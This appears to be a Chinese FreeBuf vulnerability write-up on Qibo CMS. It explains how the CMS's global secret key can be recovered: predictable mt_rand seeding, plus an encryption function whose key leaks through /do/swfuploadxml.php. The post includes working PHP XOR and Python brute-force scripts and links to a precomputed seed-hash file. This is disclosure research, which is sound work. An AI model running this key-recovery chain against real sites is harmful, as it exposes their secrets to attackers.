***本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 一、漏洞原理分析

首先漏洞产生点位于：/inc/function.inc.php 557行 rands函数

![](https://image.3001.net/images/20190911/1568177145_5d787bf9eec0d.png!small)

由于PHP函数mt_rand()具有[
_伪随机数漏洞_](https://www.freebuf.com/column/205240.html)，其原理为在种子已知的情况下，则可推测其产生的随机数。由于此rands函数中设置种子为mt_srand((double)microtime()
* 1000000);而( double)microtime() *
1000000为当前时间戳微妙乘以一百万的值，有趣的是该值为随机的1到999999其中的一个值，那么导致用于产生随机数的种子可暴力枚举(共一百万个种子)，那么该函数所产生的hash值则通过种子可以轻易枚举。再看该程序全局密钥如何产生，位于
install.php 第233行 ：

![](https://image.3001.net/images/20191008/1570498461_5d9be79d98b97.png!small)

![](https://image.3001.net/images/20191008/1570498495_5d9be7bf69091.png!small)

此时可以看到会将一个通过伪随机数求出的字符串写入配置文件中，即为全局密钥。然后再看该程序的全局加密函数mymd5函数：

![](https://image.3001.net/images/20190911/1568177663_5d787dffa06e2.png!small)

可以看到，获取加密数据有几个步骤：

>
> 1、获取绝密字符串，其值为$secret_string=$webdb[mymd5].$rand.'5*j,.^&;?.%#@!';此处可以寻找不传入$rand值的地方。
>
>
> 2、获取md5code，其值为原始字符串通过md5加密后的值取第8位开始的10个字符$md5code=substr(md5($string),8,10);
>
> 3、获取key的值，值为md5code拼接绝密字符串的md5值$key = md5($md5code.$secret_string);
>
> 4、获取code的值，值为循环获取要加密字符串和key的异或值
>
> 5、最后的加密值为code的值通过base64加密后再拼接md5code的值

此处可以通过已知的加密后的值异或原始字符串获取出key的值，条件为：

> 1、可以获取加密后的数据(去掉后10位md5code)
>
> 2、原始字符串

此时可以逆向出key的值，由于key的值为md5code拼接绝密字符串的md5的值。所以此处只需要求出
md5code拼接绝密字符串的md5的值，在与获取的key值比较，即可获取全局密钥。

## 二、漏洞利用链

可利用位置：/do/swfuploadxml.php

![](https://image.3001.net/images/20190911/1568179210_5d78840a2c6ff.png!small)

此文件将用户名以及用户id通过mymd5函数加密后输出，所以可以获取到加密后的值，此时还需获取加密前的值。通过源代码已知将用户名和用户id拼接，用户id可访问<http://target.com/member/userinfo.php>之后用户id的值可以在url中获取。

![](https://image.3001.net/images/20190911/1568179334_5d788486c9420.png!small)

此时已经具备逆向出key值的条件。由于用户名最大15位，id为6位左右，加上\t为一个字节。所以只能通过异或求出的key值为一部分，但已经足够了。

## 三、漏洞本地复现

复现环境：

PHP版本：php5.6

cms版本：[下载地址](http://www.qibosoft.com/downloadProduction.htm)

注：由于mt_rand函数版本不同，产生的随机数不同，经过测试 php7.0+为一中获取方式，php5.0 --- php7.0为一种获取方式

第一步：首先获取种子为 1~999999 的所有hash的值。

![](https://image.3001.net/images/20190911/1568179673_5d7885d95d1a7.png!small)

第二步：获取逆向出的key值

首先访问<http://localhost/78cms2/do/swfuploadxml.php>

![](https://image.3001.net/images/20190930/1569827419_5d91aa5bcebd5.png!small)

可以获取到md5code的值：3924372a07

还有通过base64加密后的code的值：FgYVEBVRSkEXBhVBMFY=

现在获取用户名以及用户id：<http://localhost/78cms2/member/userinfo.php>

![](https://image.3001.net/images/20190930/1569827441_5d91aa7109e14.png!small)

所以加密的原始字符串为：testtesttest\t3

至此获取逆向key的条件满足通过异或获取：

    
    
     1 <?php
     2 $string = "原始字符串";
     3 $len=32;
     4 $code=base64_decode("base64加密的code值");
     5 
     6 
     7 for($i=0; $i<strlen($string); $i++){ 
     8         $k = $i%$len; 
     9         $key .= $string[$i]^$code[$k];
    10     }
    11     
    12 echo $key;
    13 ?>

可以获取部分key的值为：  

![图片3.png](https://image.3001.net/images/20191010/15706859418026.png!small)

第三步：通过key值枚举出程序全局密钥

    
    
     1 import hashlib
     2 import os
     3 import base64
     4 import time
     5 
     6 def md5_convert(string):
     7     m = hashlib.md5()
     8     m.update(string.encode())
     9     return m.hexdigest()
    10 
    11 start = time.time()
    12 md5code = "3924372a07"
    13 key = "bcfda495ccf59e"
    14 file = open("php56.txt","r")
    15 for line in file:
    16     line = line.strip("\n")
    17     if len(line) == 10:
    18         str = "{}5*j,.^&;?.%#@!".format(md5code+line)
    19         code = "{}".format(md5_convert(str))
    20         if key in code:
    21             print(line)
    22             print("用时{}".format(time.time()-start))
    23             break

破解全局密钥：  

![](https://image.3001.net/images/20190911/1568180069_5d78876538c15.png!small)

此时比较程序文件中的密钥

![图片2.png](https://image.3001.net/images/20191010/15706858395689.png!small)  

完成，至于获取这字符串有什么用?...

附上本人的密钥文件(好像缺了一些)：<https://files.cnblogs.com/files/Spec/php56.zip>

## 四、漏洞修复建议

等官方更新补丁

 ***本文原创作者：小飞要做白帽子，本文属于FreeBuf原创奖励计划，未经许可禁止转载**

